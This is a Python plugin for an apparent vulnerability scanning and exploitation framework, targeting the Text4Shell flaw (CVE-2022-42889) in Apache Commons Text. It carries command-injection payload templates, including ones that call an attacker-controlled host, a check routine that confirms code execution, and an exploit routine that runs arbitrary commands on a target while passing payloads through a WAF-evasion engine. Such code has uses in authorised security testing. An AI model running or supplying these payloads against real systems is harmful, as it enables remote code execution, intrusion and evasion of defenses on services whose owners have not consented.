"""
Plugin for CVE-2022-42889: Text4Shell.
"""

from __future__ import annotations

import random
from typing import Any
import requests

from spring2shell.core.reporter import build_finding
from spring2shell.evasion.waf_engine import waf_engine
from spring2shell.plugins.base import BasePlugin
from spring2shell.utils.auth import audit_log, rate_limit_acquire


class CVE_2022_42889_Plugin(BasePlugin):
    """Text4Shell Apache Commons Text RCE (CVE-2022-42889) Plugin."""

    name = "cve_2022_42889"
    cve_id = "CVE-2022-42889"
    description = "Text4Shell — Apache Commons Text interpolation RCE"

    payload_templates = [
        "${script:javascript:java.lang.Runtime.getRuntime().exec(\"COMMAND\")}",
        "${url:UTF-8:http://ATTACKER_IP/COMMAND}",
        "${dns:address:ATTACKER_IP}",
    ]

    def check(
        self,
        session: requests.Session,
        target: str,
        endpoint: str,
        headers: dict[str, str],
    ) -> dict[str, Any] | None:
        marker = f"RCE_{random.randint(100000, 999999)}"
        test_cmd = f"echo {marker}"
        content_types = ["application/json", "application/x-www-form-urlencoded", "text/plain"]

        for payload_template in self.payload_templates:
            # Skip attractor payloads in check unless we have OOB or they are local
            if "ATTACKER_IP" in payload_template:
                continue

            payload = payload_template.replace("COMMAND", test_cmd)
            for ct in content_types:
                req_headers = headers.copy()
                req_headers["Content-Type"] = ct
                payload, req_headers = waf_engine.apply(payload, req_headers)

                try:
                    rate_limit_acquire()
                    resp = session.post(endpoint, data=payload, headers=req_headers, timeout=5)
                    audit_log("POST", endpoint, resp.status_code, payload[:100], "cve_scan")

                    if resp.status_code in (200, 400, 500) and marker in resp.text:
                        return build_finding(
                            url=target,
                            endpoint=endpoint,
                            status="confirmed",
                            cve=self.cve_id,
                            confidence="high",
                            reason="CVE_2022_42889_CONFIRMED",
                            evidence=f"Reflected command execution marker '{marker}' in response.",
                            payload=payload,
                            method="POST",
                            status_code=resp.status_code,
                            framework="Apache Commons Text",
                        )
                except Exception:
                    continue
        return None

    def exploit(
        self,
        session: requests.Session,
        target: str,
        endpoint: str,
        headers: dict[str, str],
        command: str,
    ) -> str | None:
        content_types = ["application/json", "application/x-www-form-urlencoded", "text/plain"]
        for payload_template in self.payload_templates:
            if "ATTACKER_IP" in payload_template:
                continue
            payload = payload_template.replace("COMMAND", command)
            for ct in content_types:
                req_headers = headers.copy()
                req_headers["Content-Type"] = ct
                payload, req_headers = waf_engine.apply(payload, req_headers)

                try:
                    resp = session.post(endpoint, data=payload, headers=req_headers, timeout=8)
                    if resp.status_code in (200, 400, 500) and resp.text:
                        return resp.text
                except Exception:
                    continue
        return None
